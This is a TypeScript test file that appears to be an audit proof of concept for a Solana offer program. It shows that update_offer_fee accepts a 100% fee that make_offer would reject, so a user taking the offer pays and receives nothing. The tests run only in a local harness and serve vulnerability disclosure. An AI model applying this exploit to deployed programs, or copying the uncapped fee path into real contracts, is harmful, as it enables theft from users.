import { Keypair, PublicKey } from "@solana/web3.js";
import { getAssociatedTokenAddressSync } from "@solana/spl-token";
import { TestHelper } from "../test_helper";
import { OnreProgram } from "../onre_program.ts";

describe("PoC – update_offer_fee bypasses 10% cap and lets boss steal 100%", () => {
    let testHelper: TestHelper;
    let program: OnreProgram;

    let tokenInMint: PublicKey;  // USDC-like, 6 decimals
    let tokenOutMint: PublicKey; // ONyc-like, 9 decimals

    let user: Keypair;
    let userTokenInAccount: PublicKey;
    let userTokenOutAccount: PublicKey;
    let bossTokenInAccount: PublicKey;

    beforeEach(async () => {
        testHelper = await TestHelper.create();
        program = new OnreProgram(testHelper);

        tokenInMint  = testHelper.createMint(6);
        tokenOutMint = testHelper.createMint(9);

        await program.initialize({ onycMint: tokenOutMint });

        // Boss publishes an offer at the legitimate 5% fee.
        await program.makeOffer({
            tokenInMint,
            tokenOutMint,
            feeBasisPoints: 500, // 5%
        });

        // One active pricing vector at price 1.0
        const now = await testHelper.getCurrentClockTime();
        await program.addOfferVector({
            tokenInMint,
            tokenOutMint,
            baseTime: now,
            basePrice: 1e9, // 1.0 with 9-decimal price scale
            apr: 0,
            priceFixDuration: 86_400,
        });

        // Set up user / boss / vault accounts (mirrors take_offer.spec.ts).
        user = testHelper.createUserAccount();
        userTokenInAccount  = testHelper.createTokenAccount(tokenInMint,  user.publicKey,           BigInt(1_000e6), true);
        userTokenOutAccount = getAssociatedTokenAddressSync(tokenOutMint, user.publicKey);
        bossTokenInAccount  = testHelper.createTokenAccount(tokenInMint,  testHelper.getBoss(),     BigInt(0));
        testHelper.createTokenAccount(tokenOutMint, testHelper.getBoss(), BigInt(10_000e9));
        testHelper.createTokenAccount(tokenInMint,  program.pdas.offerVaultAuthorityPda, BigInt(0), true);
        testHelper.createTokenAccount(tokenOutMint, program.pdas.offerVaultAuthorityPda, BigInt(0), true);

        await program.offerVaultDeposit({ amount: 10_000e9, tokenMint: tokenOutMint });
    });

    it("make_offer rejects feeBasisPoints > 1000 (MAX_ALLOWED_FEE_BPS)", async () => {
        const fresh_in  = testHelper.createMint(6);
        const fresh_out = testHelper.createMint(9);

        await expect(
            program.makeOffer({
                tokenInMint:  fresh_in,
                tokenOutMint: fresh_out,
                feeBasisPoints: 1001, // > MAX_ALLOWED_FEE_BPS
            })
        ).rejects.toThrow("Invalid fee: fee_basis_points must be <= 10000");
    });

    it("BUG: update_offer_fee accepts 10000 bps (100%) even though make_offer cap is 1000", async () => {
        await program.updateOfferFee({
            tokenInMint,
            tokenOutMint,
            newFee: 10_000, // 100% – well beyond the 10% intended cap
        });

        const offer = await program.getOffer(tokenInMint, tokenOutMint);
        expect(offer.feeBasisPoints).toBe(10_000); // accepted by the program
    });

    it("EXPLOIT: after raising fee to 100%, taker pays full amount and receives 0 token_out", async () => {
        // Boss flips fee to 100%
        await program.updateOfferFee({
            tokenInMint,
            tokenOutMint,
            newFee: 10_000,
        });

        const userInBefore   = await testHelper.getTokenAccountBalance(userTokenInAccount);

        // A normal user takes the offer
        const tokenInAmount = 1_000_000; // 1.0 USDC (6 decimals)
        await program.takeOffer({
            tokenInAmount,
            tokenInMint,
            tokenOutMint,
            user: user.publicKey,
            signer: user,
        });

        const userInAfter    = await testHelper.getTokenAccountBalance(userTokenInAccount);
        const userOutAfter   = await testHelper.getTokenAccountBalance(userTokenOutAccount);

        // User spent the full amount in token_in.
        expect(userInBefore - userInAfter).toBe(BigInt(tokenInAmount));
        // And the user got NOTHING in return.
        expect(userOutAfter).toBe(BigInt(0));
    });
});